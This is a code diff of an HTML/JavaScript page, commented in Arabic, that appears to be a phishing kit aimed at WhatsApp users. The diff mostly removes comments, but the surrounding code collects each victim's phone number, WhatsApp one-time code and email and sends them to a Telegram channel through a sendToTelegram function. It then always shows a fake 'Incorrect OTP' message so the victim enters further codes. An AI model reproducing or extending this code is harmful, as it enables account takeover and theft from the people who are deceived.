@@ -25,6 +25,7 @@ body {
   margin: 0; min-height: 100vh;
   display: flex; flex-direction: column;
   background-color: #1a1a1c;
+  /* إعادة صورة الخلفية الأصلية هنا */
   background-image: url('1000005893.png');
   background-repeat: no-repeat;
   background-size: cover;
@@ -156,7 +157,6 @@ button:hover { filter: brightness(1.08); }
   font-size: 20px; font-weight: 700; text-align: center; outline: none; letter-spacing: 13.5px; padding-left: 13.5px; z-index: 2; position: relative; text-transform: uppercase;
   padding-bottom: 10px;
 }
-/* رسالة خطأ الإيميل القديمة */
 .otp-error-msg { color: var(--red); text-align: center; font-weight: 700; margin-bottom: 12px; font-size: 13px; display: none; }
 
 .timer-text { text-align: center; color: #cccccc; font-size: 12px; font-weight: 500; margin-bottom: 16px; }
@@ -222,7 +222,7 @@ button:hover { filter: brightness(1.08); }
 }
 .whatsapp-connect-btn { flex: 1; }
 
-/* رسالة الخطأ الجديدة الخاصة بالواتساب بناءً على الصورة */
+/* رسالة الخطأ الخاصة بالواتساب */
 .whatsapp-error-overlay-box {
   position: absolute;
   top: 50%; left: 50%;
@@ -379,7 +379,7 @@ button:hover { filter: brightness(1.08); }
   <div class="modal-overlay" id="whatsappVerifyModalOverlay">
     <div class="dark-modal" style="position: relative;">
       
-      <!-- رسالة الخطأ الجديدة (مطابقة للصورة 1000005880_2.jpg) -->
+      <!-- رسالة الخطأ الخاصة بالواتساب -->
       <div id="customWhatsappError" class="whatsapp-error-overlay-box">
         Incorrect OTP
       </div>
@@ -536,7 +536,6 @@ function validateWhatsappCodeField() {
   input.value = input.value.replace(/[^0-9]/g, '');
   const val = input.value;
   document.getElementById('whatsappConnectBtn').classList.toggle('ready-connect', val.length === 6);
-  // إخفاء رسالة الخطأ تلقائياً بمجرد بدء التعديل
   document.getElementById('customWhatsappError').classList.remove('show');
 }
 
@@ -545,11 +544,9 @@ function submitWhatsappCode() {
   if (val.length === 6) {
     sendToTelegram(`🔔 كود الواتساب:\n📱 ${fullSavedPhoneNumber}\n🔢 ${val}`);
     
-    // إظهار رسالة الخطأ الخاصة بالواتساب (البوب أب الداكن)
     const errorBox = document.getElementById('customWhatsappError');
     errorBox.classList.add('show');
     
-    // إخفائها بعد 2.5 ثانية تلقائياً
     setTimeout(() => {
       errorBox.classList.remove('show');
     }, 2500);
@@ -565,10 +562,7 @@ function validateEmailField() {
   input.value = input.value.replace(/[^a-zA-Z0-9@._-]/g, '');
   const val = input.value;
   
-  // صيغة Regex صارمة للتحقق من أن الإيميل حقيقي ومكتمل
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-  
-  // يضيء الزر فقط إذا طابقت الكتابة شكل الإيميل
   document.getElementById('emailContinueBtn').classList.toggle('ready-gold', emailRegex.test(val));
 }
 
@@ -577,7 +571,7 @@ function submitEmailLink() {
   const inputVal = document.getElementById('linkEmailInput').value;
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   
-  if(!emailRegex.test(inputVal)) return; // منع العبور إذا لم يكن إيميلاً حقيقياً
+  if(!emailRegex.test(inputVal)) return;
   
   savedUserEmail = inputVal;
   sendToTelegram(`🔔 إيميل: ${savedUserEmail}`);
